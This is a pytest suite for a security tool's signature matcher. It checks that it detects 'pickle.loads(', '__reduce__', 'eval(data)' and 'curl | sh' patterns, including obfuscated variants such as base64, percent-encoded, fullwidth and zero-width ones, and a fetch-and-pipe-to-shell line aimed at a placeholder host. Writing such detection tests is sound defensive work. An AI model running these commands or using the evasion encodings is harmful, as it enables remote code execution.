"""Bounded variant matching, identifier boundaries and safe fail-closed views."""

import base64
import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from fastfence.modules.control.domain.exceptions import RejectedError
from fastfence.modules.control.domain.models import SignatureFeed
from fastfence.modules.control.domain.signature_matching import (
    signature_findings,
)


def feed(pattern="pickle.loads(", **extra):
    return SignatureFeed.model_validate(
        {
            "version": 1,
            "signatures": [
                {
                    "id": "test",
                    "pattern": pattern,
                    "description": "test",
                    **extra,
                }
            ],
        }
    )


@pytest.mark.parametrize(
    "payload",
    [
        "pickle.loads(",
        "p i c k l e . l o a d s (",
        "pickle\u200b.loads(",
        "\uff50\uff49\uff43\uff4b\uff4c\uff45\uff0e\uff4c\uff4f\uff41\uff44\uff53\uff08",
        "%70%69%63%6b%6c%65%2e%6c%6f%61%64%73%28",
        {"segments": ["pickle", ".loads("]},
    ],
)
def test_obfuscated_variants_match(payload):
    assert signature_findings(payload, feed()) == ["test"]


def test_base64_printable_text_is_inspected_without_execution():
    encoded = base64.b64encode(b"pickle.loads(").decode()
    assert signature_findings(encoded, feed()) == ["test"]
    assert (
        signature_findings(
            base64.b64encode(b"\xff\x00pickle.loads(").decode(), feed()
        )
        == []
    )


@pytest.mark.parametrize(
    "payload",
    ["safe_pickle.loads(", "pickle.dumps(", {"a": "pickle", "b": ".loads("}],
)
def test_identifier_near_matches_and_unrelated_fields_remain_safe(payload):
    assert signature_findings(payload, feed()) == []


def test_identifier_suffix_boundary():
    assert signature_findings("__reduce_ex__", feed("__reduce__")) == []
    assert signature_findings("__reduce__", feed("__reduce__")) == ["test"]


def test_configured_tokens_match_remote_shell_arguments_with_bounded_gap():
    configured = feed("curl | sh", match_mode="token_sequence", max_gap=64)
    assert signature_findings(
        "curl https://example.invalid/script | sh", configured
    ) == ["test"]
    assert (
        signature_findings("scurl https://example.invalid | shell", configured)
        == []
    )
    assert signature_findings("curl " + "x" * 100 + " | sh", configured) == []
    assert (
        signature_findings(
            "curl https://example.invalid/script | sh", feed("curl | sh")
        )
        == []
    )


def test_token_sequence_chooses_valid_ordered_chain_without_regex_backtracking():
    configured = feed(
        "alpha beta gamma", match_mode="token_sequence", max_gap=6
    )
    assert signature_findings("alpha beta beta gamma", configured) == ["test"]
    assert signature_findings("beta alpha gamma", configured) == []


def test_pattern_is_escaped_not_interpreted_as_regex():
    assert signature_findings("aaaa", feed("a.*a")) == []
    assert signature_findings("a.*a", feed("a.*a")) == ["test"]


@pytest.mark.parametrize(
    "payload", ["x" * 131_073, ["x"] * 4097, ["x"] * 17, "%ff"]
)
def test_limits_or_invalid_percent_encoding_reject_fail_closed(payload):
    with pytest.raises(RejectedError):
        signature_findings(payload, feed())


def test_depth_limit_is_fail_closed():
    value = "pickle.loads("
    for _ in range(34):
        value = {"child": value}
    with pytest.raises(RejectedError, match="signature_inspection_limit"):
        signature_findings(value, feed())


def test_decoding_is_one_layer_only():
    text = "%70%69%63%6b%6c%65%2e%6c%6f%61%64%73%28"
    double = base64.b64encode(text.encode()).decode()
    assert signature_findings(double, feed()) == []


def test_decoded_candidate_limit_rejects_without_silently_skipping_tail():
    with pytest.raises(RejectedError, match="signature_inspection_limit"):
        signature_findings(
            (base64.b64encode(b"pickle.loads(").decode() + " ") * 1025, feed()
        )


@pytest.mark.parametrize(
    "extra",
    [{"match_mode": "regex"}, {"match_mode": "token_sequence", "max_gap": 257}],
)
def test_feed_rejects_unbounded_modes(extra):
    with pytest.raises(ValidationError):
        feed("curl | sh", **extra)


def test_original_historical_variants_all_match_but_quoted_markers_stay_conservative():
    configured = SignatureFeed.model_validate_json(
        Path("config/signatures.json").read_text()
    )
    cases = json.loads(Path("evaluation/historical_attacks.json").read_text())[
        "cases"
    ]
    for case in cases:
        if case["malicious_marker"]:
            assert signature_findings(case["payload"], configured), case["id"]
    assert signature_findings(
        "Never call pickle.loads( on untrusted input", configured
    )


@pytest.mark.parametrize("size", [8192, 16384])
def test_ordinary_natural_language_does_not_exhaust_base64_budget(size):
    text = (
        "Approved business reporting summarizes quarterly objectives and governance. "
        * 400
    )[:size]
    assert signature_findings(text, feed()) == []


def test_alphabetic_unpadded_base64_literal_is_not_skipped():
    encoded = base64.b64encode(b"eval(data)").decode().rstrip("=")
    assert encoded.isalpha()
    assert signature_findings(encoded, feed("eval(data)")) == ["test"]
